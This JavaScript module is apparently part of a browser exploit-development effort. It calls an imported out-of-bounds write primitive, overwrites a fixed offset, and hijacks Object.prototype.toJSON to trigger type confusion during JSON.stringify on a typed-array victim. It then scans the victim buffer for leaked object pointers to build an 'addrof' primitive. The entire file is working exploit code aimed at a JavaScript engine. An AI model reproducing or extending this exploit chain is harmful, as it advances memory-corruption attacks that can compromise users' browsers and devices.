// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v16_AggressiveVictimInteraction)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI = "OriginalHeisenbug_TypedArrayAddrof_v16_AggressiveVictimInteraction";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let latest_known_probe_details_v16 = null; 
let object_to_leak_A_v16 = null;
let object_to_leak_B_v16 = null;
let victim_typed_array_ref_v16 = null; // Tornar acessível globalmente no módulo
let probe_call_count_v16 = 0;

function toJSON_TA_Probe_AggressiveVictimInteraction() {
    probe_call_count_v16++;
    let current_call_details = {
        call_number: probe_call_count_v16,
        probe_variant: "TA_Probe_Addrof_v16_AggressiveVictimInteraction",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
        victim_interaction_attempted: false,
        victim_interaction_error: null
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v16);
        
        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}.`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'! IsVictim? ${current_call_details.this_is_victim_ref}`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is confused. Attempting AGGRESSIVE interaction with victim_typed_array_ref_v16...`, "warn");
            current_call_details.victim_interaction_attempted = true;
            try {
                if (object_to_leak_A_v16) {
                    logS3(`   Attempting victim_typed_array_ref_v16[0] = object_A`, "info");
                    victim_typed_array_ref_v16[0] = object_to_leak_A_v16;

                    logS3(`   Attempting Object.defineProperty(victim_typed_array_ref_v16, "2", {value: object_A})`, "info"); // Usar índice diferente
                    Object.defineProperty(victim_typed_array_ref_v16, "2", { value: object_to_leak_A_v16, writable: true, enumerable: true, configurable: true });
                }
                if (object_to_leak_B_v16) {
                    logS3(`   Attempting victim_typed_array_ref_v16[1] = object_B`, "info");
                    victim_typed_array_ref_v16[1] = object_to_leak_B_v16;

                    logS3(`   Attempting Object.defineProperty(victim_typed_array_ref_v16, "3", {value: object_B})`, "info"); // Usar índice diferente
                    Object.defineProperty(victim_typed_array_ref_v16, "3", { value: object_to_leak_B_v16, writable: true, enumerable: true, configurable: true });
                }
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Aggressive interaction with victim_typed_array_ref_v16 completed.`, "info");
            } catch (e_victim_write) {
                current_call_details.victim_interaction_error = e_victim_write.message;
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: ERROR during aggressive victim interaction: ${e_victim_write.message}`, "error");
            }
        } else if (current_call_details.this_is_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    
    latest_known_probe_details_v16 = { ...current_call_details }; 
    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Global updated. Returning marker.`, "dev_verbose");

    return { "probe_source_call_marker_v16": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_AggressiveVictimInteraction() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (AggressiveVictimInteraction) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI} Init...`;

    probe_call_count_v16 = 0;
    latest_known_probe_details_v16 = null; 
    victim_typed_array_ref_v16 = null; 
    object_to_leak_A_v16 = { marker: "ObjA_TA_v16avi", id: Date.now() }; 
    object_to_leak_B_v16 = { marker: "ObjB_TA_v16avi", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_details_of_last_probe_run = null; 
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A[0]: Default" };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B[1]: Default" };
    let addrof_result_C = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof C[2]: Default" }; // For defineProperty
    let addrof_result_D = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof D[3]: Default" }; // For defineProperty

    const fillPattern = 0.16161616161616;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v16 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v16.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v16 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AggressiveVictimInteraction, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v16); 
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            if (latest_known_probe_details_v16) {
                captured_details_of_last_probe_run = { ...latest_known_probe_details_v16 }; 
            }
            logS3(`  Captured details of LAST probe run: ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugObservedOnThisInProbe = false;
            if (captured_details_of_last_probe_run && 
                captured_details_of_last_probe_run.probe_called &&
                captured_details_of_last_probe_run.this_type_in_toJSON === "[object Object]") {
                heisenbugObservedOnThisInProbe = true;
                logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED! 'this' type: ${captured_details_of_last_probe_run.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERT: Heisenbug on 'this' of probe NOT confirmed. Last type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type_in_toJSON : 'N/A'}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
            // Check view[0] and view[1] for direct assignment
            // Check view[2] and view[3] for Object.defineProperty
            const indices_to_check = [0, 1, 2, 3];
            const results_objects = [addrof_result_A, addrof_result_B, addrof_result_C, addrof_result_D];

            for (let i = 0; i < indices_to_check.length; i++) {
                const idx = indices_to_check[i];
                const res_obj = results_objects[i];
                const val_double = float64_view_on_underlying_ab[idx];
                
                res_obj.leaked_address_as_double = val_double;
                let temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
                res_obj.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf)[0], new Uint32Array(temp_buf)[1]);
                logS3(`  Value read from view[${idx}]: ${val_double} (${res_obj.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

                if (val_double !== (fillPattern + idx) && val_double !== 0 &&
                    (res_obj.leaked_address_as_int64.high() < 0x00020000 || (res_obj.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3(`  !!!! POTENTIAL POINTER READ at view[${idx}] !!!!`, "vuln", FNAME_CURRENT_TEST);
                    res_obj.success = true;
                    res_obj.message = `Possible pointer at view[${idx}].`;
                } else {
                    res_obj.message = `No pointer at view[${idx}]. Buffer unchanged or not a pointer.`;
                    if (heisenbugObservedOnThisInProbe) res_obj.message = "Heisenbug on 'this' of probe observed, but " + res_obj.message;
                    if (val_double === (fillPattern + idx)) res_obj.message += " (Value matches initial fillPattern)";
                }
            }

            if (addrof_result_A.success || addrof_result_B.success || addrof_result_C.success || addrof_result_D.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI}: Addr? SUCESSO!`;
            } else if (heisenbugObservedOnThisInProbe) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V16_AVI} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v16}`, "info", FNAME_CURRENT_TEST);
        [addrof_result_A, addrof_result_B, addrof_result_C, addrof_result_D].forEach((res, i) => {
             logS3(`Addrof [${i}]: Success=${res.success}, Msg='${res.message}'`, res.success ? "good" : "warn", FNAME_CURRENT_TEST);
        });
        
        victim_typed_array_ref_v16 = null; 
        latest_known_probe_details_v16 = null; 
        probe_call_count_v16 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_details_of_last_probe_run, 
        total_probe_calls: probe_call_count_v16,
        addrof_A_attempt_result: addrof_result_A, // direct assignment victim[0]
        addrof_B_attempt_result: addrof_result_B, // direct assignment victim[1]
        addrof_C_attempt_result: addrof_result_C, // defineProperty victim[2]
        addrof_D_attempt_result: addrof_result_D  // defineProperty victim[3]
    };
}
